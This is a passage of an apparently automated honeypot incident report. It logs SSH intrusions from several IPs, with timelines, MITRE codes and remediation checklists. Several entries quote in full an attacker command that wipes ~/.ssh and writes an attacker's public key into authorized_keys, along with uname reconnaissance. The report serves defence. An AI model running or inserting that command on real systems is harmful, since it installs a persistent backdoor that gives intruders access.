| `2026-06-15 07:55:02` | `cowrie.client.version` |
| `2026-06-15 07:55:02` | `cowrie.client.kex` |
| `2026-06-15 07:55:02` | `cowrie.login.success` |
| `2026-06-15 07:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b3debb71e55

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:58 |
| **Last Seen** | 2026-06-15 07:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:58:43` | `cowrie.session.connect` |
| `2026-06-15 07:58:43` | `cowrie.client.version` |
| `2026-06-15 07:58:43` | `cowrie.client.kex` |
| `2026-06-15 07:58:43` | `cowrie.login.success` |
| `2026-06-15 07:58:44` | `cowrie.session.params` |
| `2026-06-15 07:58:44` | `cowrie.command.input` |
| `2026-06-15 07:58:44` | `cowrie.command.failed` |
| `2026-06-15 07:58:44` | `cowrie.log.closed` |
| `2026-06-15 07:58:44` | `cowrie.session.params` |
| `2026-06-15 07:58:44` | `cowrie.command.input` |
| `2026-06-15 07:58:44` | `cowrie.session.file_download` |
| `2026-06-15 07:58:44` | `cowrie.log.closed` |
| `2026-06-15 07:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9920076c248e

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:58 |
| **Last Seen** | 2026-06-15 07:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:58:46` | `cowrie.session.connect` |
| `2026-06-15 07:58:46` | `cowrie.client.version` |
| `2026-06-15 07:58:46` | `cowrie.client.kex` |
| `2026-06-15 07:58:47` | `cowrie.login.success` |
| `2026-06-15 07:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c67c6d69263

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:59 |
| **Last Seen** | 2026-06-15 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:59:27` | `cowrie.session.connect` |
| `2026-06-15 07:59:27` | `cowrie.client.version` |
| `2026-06-15 07:59:27` | `cowrie.client.kex` |
| `2026-06-15 07:59:28` | `cowrie.login.success` |
| `2026-06-15 07:59:28` | `cowrie.session.params` |
| `2026-06-15 07:59:28` | `cowrie.command.input` |
| `2026-06-15 07:59:28` | `cowrie.command.failed` |
| `2026-06-15 07:59:28` | `cowrie.log.closed` |
| `2026-06-15 07:59:28` | `cowrie.session.params` |
| `2026-06-15 07:59:28` | `cowrie.command.input` |
| `2026-06-15 07:59:28` | `cowrie.session.file_download` |
| `2026-06-15 07:59:28` | `cowrie.log.closed` |
| `2026-06-15 07:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c76ddcb560e5

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 07:59 |
| **Last Seen** | 2026-06-15 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 07:59:30` | `cowrie.session.connect` |
| `2026-06-15 07:59:30` | `cowrie.client.version` |
| `2026-06-15 07:59:31` | `cowrie.client.kex` |
| `2026-06-15 07:59:31` | `cowrie.login.success` |
| `2026-06-15 07:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1379ecf03852

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:00 |
| **Last Seen** | 2026-06-15 08:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:00:12` | `cowrie.session.connect` |
| `2026-06-15 08:00:12` | `cowrie.client.version` |
| `2026-06-15 08:00:12` | `cowrie.client.kex` |
| `2026-06-15 08:00:12` | `cowrie.login.success` |
| `2026-06-15 08:00:12` | `cowrie.session.params` |
| `2026-06-15 08:00:12` | `cowrie.command.input` |
| `2026-06-15 08:00:12` | `cowrie.command.failed` |
| `2026-06-15 08:00:13` | `cowrie.log.closed` |
| `2026-06-15 08:00:13` | `cowrie.session.params` |
| `2026-06-15 08:00:13` | `cowrie.command.input` |
| `2026-06-15 08:00:13` | `cowrie.session.file_download` |
| `2026-06-15 08:00:13` | `cowrie.log.closed` |
| `2026-06-15 08:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9986cb89caa1

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:00 |
| **Last Seen** | 2026-06-15 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:00:15` | `cowrie.session.connect` |
| `2026-06-15 08:00:15` | `cowrie.client.version` |
| `2026-06-15 08:00:15` | `cowrie.client.kex` |
| `2026-06-15 08:00:15` | `cowrie.login.success` |
| `2026-06-15 08:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5fc926fbef

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:02 |
| **Last Seen** | 2026-06-15 08:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:02:57` | `cowrie.session.connect` |
| `2026-06-15 08:02:57` | `cowrie.client.version` |
| `2026-06-15 08:02:57` | `cowrie.client.kex` |
| `2026-06-15 08:02:57` | `cowrie.login.success` |
| `2026-06-15 08:02:58` | `cowrie.session.params` |
| `2026-06-15 08:02:58` | `cowrie.command.input` |
| `2026-06-15 08:02:58` | `cowrie.command.failed` |
| `2026-06-15 08:02:58` | `cowrie.log.closed` |
| `2026-06-15 08:02:58` | `cowrie.session.params` |
| `2026-06-15 08:02:58` | `cowrie.command.input` |
| `2026-06-15 08:02:58` | `cowrie.session.file_download` |
| `2026-06-15 08:02:58` | `cowrie.log.closed` |
| `2026-06-15 08:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11085204ed31

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:03 |
| **Last Seen** | 2026-06-15 08:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:03:00` | `cowrie.session.connect` |
| `2026-06-15 08:03:00` | `cowrie.client.version` |
| `2026-06-15 08:03:00` | `cowrie.client.kex` |
| `2026-06-15 08:03:01` | `cowrie.login.success` |
| `2026-06-15 08:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d628a0a0da32

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:06 |
| **Last Seen** | 2026-06-15 08:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:06:51` | `cowrie.session.connect` |
| `2026-06-15 08:06:51` | `cowrie.client.version` |
| `2026-06-15 08:06:51` | `cowrie.client.kex` |
| `2026-06-15 08:06:52` | `cowrie.login.success` |
| `2026-06-15 08:06:52` | `cowrie.session.params` |
| `2026-06-15 08:06:52` | `cowrie.command.input` |
| `2026-06-15 08:06:52` | `cowrie.command.failed` |
| `2026-06-15 08:06:52` | `cowrie.log.closed` |
| `2026-06-15 08:06:52` | `cowrie.session.params` |
| `2026-06-15 08:06:52` | `cowrie.command.input` |
| `2026-06-15 08:06:53` | `cowrie.session.file_download` |
| `2026-06-15 08:06:53` | `cowrie.log.closed` |
| `2026-06-15 08:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455b4b8b7b0e

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:06 |
| **Last Seen** | 2026-06-15 08:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:06:55` | `cowrie.session.connect` |
| `2026-06-15 08:06:55` | `cowrie.client.version` |
| `2026-06-15 08:06:55` | `cowrie.client.kex` |
| `2026-06-15 08:06:55` | `cowrie.login.success` |
| `2026-06-15 08:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f6c756d1a0b

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:08 |
| **Last Seen** | 2026-06-15 08:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:08:19` | `cowrie.session.connect` |
| `2026-06-15 08:08:19` | `cowrie.client.version` |
| `2026-06-15 08:08:20` | `cowrie.client.kex` |
| `2026-06-15 08:08:20` | `cowrie.login.success` |
| `2026-06-15 08:08:20` | `cowrie.session.params` |
| `2026-06-15 08:08:20` | `cowrie.command.input` |
| `2026-06-15 08:08:20` | `cowrie.command.failed` |
| `2026-06-15 08:08:21` | `cowrie.log.closed` |
| `2026-06-15 08:08:21` | `cowrie.session.params` |
| `2026-06-15 08:08:21` | `cowrie.command.input` |
| `2026-06-15 08:08:21` | `cowrie.session.file_download` |
| `2026-06-15 08:08:21` | `cowrie.log.closed` |
| `2026-06-15 08:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2235ef3e802

| Field | Detail |
|---|---|
| **Source IP** | `47.242.105[.]190` |
| **First Seen** | 2026-06-15 08:08 |
| **Last Seen** | 2026-06-15 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 08:08:23` | `cowrie.session.connect` |
| `2026-06-15 08:08:23` | `cowrie.client.version` |
| `2026-06-15 08:08:23` | `cowrie.client.kex` |
| `2026-06-15 08:08:24` | `cowrie.login.success` |
| `2026-06-15 08:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.242.105[.]190` to AbuseIPDB if not already reported
- [ ] Block `47.242.105[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82800a66661

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-06-15 10:15 |
| **Last Seen** | 2026-06-15 10:15 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:15:33` | `cowrie.session.connect` |
| `2026-06-15 10:15:34` | `cowrie.client.version` |
| `2026-06-15 10:15:34` | `cowrie.client.kex` |
| `2026-06-15 10:15:40` | `cowrie.login.success` |
| `2026-06-15 10:15:41` | `cowrie.session.params` |
| `2026-06-15 10:15:41` | `cowrie.command.input` |
| `2026-06-15 10:15:41` | `cowrie.command.failed` |
| `2026-06-15 10:15:41` | `cowrie.log.closed` |
| `2026-06-15 10:15:43` | `cowrie.session.params` |
| `2026-06-15 10:15:43` | `cowrie.command.input` |
| `2026-06-15 10:15:44` | `cowrie.session.file_download` |
| `2026-06-15 10:15:44` | `cowrie.log.closed` |
| `2026-06-15 10:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f9bbf94001

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-06-15 10:15 |
| **Last Seen** | 2026-06-15 10:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:15:51` | `cowrie.session.connect` |
| `2026-06-15 10:15:51` | `cowrie.client.version` |
| `2026-06-15 10:15:51` | `cowrie.client.kex` |
| `2026-06-15 10:15:55` | `cowrie.login.success` |
| `2026-06-15 10:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0631b04378f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:36 |
| **Last Seen** | 2026-06-15 10:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:36:31` | `cowrie.session.connect` |
| `2026-06-15 10:36:32` | `cowrie.client.version` |
| `2026-06-15 10:36:32` | `cowrie.client.kex` |
| `2026-06-15 10:36:37` | `cowrie.login.success` |
| `2026-06-15 10:36:40` | `cowrie.session.params` |
| `2026-06-15 10:36:40` | `cowrie.command.input` |
| `2026-06-15 10:36:41` | `cowrie.log.closed` |
| `2026-06-15 10:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b796c2bf1f7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:37 |
| **Last Seen** | 2026-06-15 10:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:37:22` | `cowrie.session.connect` |
| `2026-06-15 10:37:23` | `cowrie.client.version` |
| `2026-06-15 10:37:23` | `cowrie.client.kex` |
| `2026-06-15 10:37:25` | `cowrie.login.success` |
| `2026-06-15 10:37:26` | `cowrie.session.params` |
| `2026-06-15 10:37:26` | `cowrie.command.input` |
| `2026-06-15 10:37:26` | `cowrie.log.closed` |
| `2026-06-15 10:37:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447fe84bdd4e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:37 |
| **Last Seen** | 2026-06-15 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:37:53` | `cowrie.session.connect` |
| `2026-06-15 10:37:53` | `cowrie.client.version` |
| `2026-06-15 10:37:54` | `cowrie.client.kex` |
| `2026-06-15 10:37:54` | `cowrie.login.success` |
| `2026-06-15 10:37:55` | `cowrie.session.params` |
| `2026-06-15 10:37:55` | `cowrie.command.input` |
| `2026-06-15 10:37:55` | `cowrie.log.closed` |
| `2026-06-15 10:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50fba53a96b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]151` |
| **First Seen** | 2026-06-15 10:38 |
| **Last Seen** | 2026-06-15 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 10:38:41` | `cowrie.session.connect` |
| `2026-06-15 10:38:41` | `cowrie.client.version` |
| `2026-06-15 10:38:41` | `cowrie.client.kex` |
| `2026-06-15 10:38:42` | `cowrie.login.success` |
| `2026-06-15 10:38:43` | `cowrie.session.params` |
| `2026-06-15 10:38:43` | `cowrie.command.input` |
| `2026-06-15 10:38:43` | `cowrie.log.closed` |
| `2026-06-15 10:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fd46e0fb2d5

| Field | Detail |
|---|---|
